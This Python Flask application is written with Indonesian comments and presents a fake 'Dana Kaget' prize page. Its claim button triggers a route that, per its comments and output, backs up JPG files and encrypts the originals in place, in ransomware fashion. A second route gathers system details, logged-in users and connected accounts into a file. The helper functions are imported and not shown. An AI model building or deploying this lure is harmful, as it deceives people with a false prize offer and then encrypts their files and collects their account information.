from flask import Flask
from info_script import get_system_info, get_logged_in_users, get_connected_accounts, backup_jpg_files
import os

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dana Kaget</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background-color: #f5f5f5;
            }

            .container {
                text-align: center;
                background: #ffffff;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                padding: 20px;
                width: 300px;
            }

            .header h1 {
                color: #FF5722;
            }

            .content p {
                color: #666666;
                margin-bottom: 20px;
            }

            .btn {
                display: inline-block;
                background-color: #FF5722;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
                text-decoration: none;
                transition: background-color 0.3s;
            }

            .btn:hover {
                background-color: #E64A19;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Dana Kaget</h1>
            </div>
            <div class="content">
                <p>Selamat! Anda mendapatkan kesempatan untuk mendapatakan Dana Kaget,pencet tombol untuk mengklaimnya !</p>
                <a href="/backup_jpg_files" class="btn">klaim Sekarang</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/run_python_code')
def run_python_code():
    # Jalankan fungsi-fungsi dan ambil informasi sistem
    system_info = get_system_info()
    logged_in_users = get_logged_in_users()
    connected_accounts = get_connected_accounts()

    # Buat string hasil
    result = "Informasi Sistem:\n"
    for key, value in system_info.items():
        result += f"{key}: {value}\n"

    result += "\nPengguna yang Sedang Login:\n"
    result += logged_in_users + "\n"

    result += "\nAkun yang Terhubung:\n"
    for account in connected_accounts:
        result += account + "\n"

    # Simpan hasil ke file teks di folder images
    os.makedirs("images", exist_ok=True)
    file_path = os.path.join("images", "system_info.txt")
    with open(file_path, "w") as file:
        file.write(result)

    return "Python code has been executed and the result has been saved on the server."

@app.route('/backup_jpg_files')
def backup_jpg_files_route():
    # Tentukan direktori yang ingin dicari dan direktori yang dikecualikan
    directory_to_search = "/..."
    exclude_directory = "/..."
    # Backup file JPG dan enkripsi yang asli di tempatnya
    jpg_files = backup_jpg_files(directory_to_search, "images", exclude_directory)

    return f"{len(jpg_files)} JPG files have been backed up and original files have been encrypted on the server."

if __name__ == '__main__':
    app.run(port=5020, debug=True)
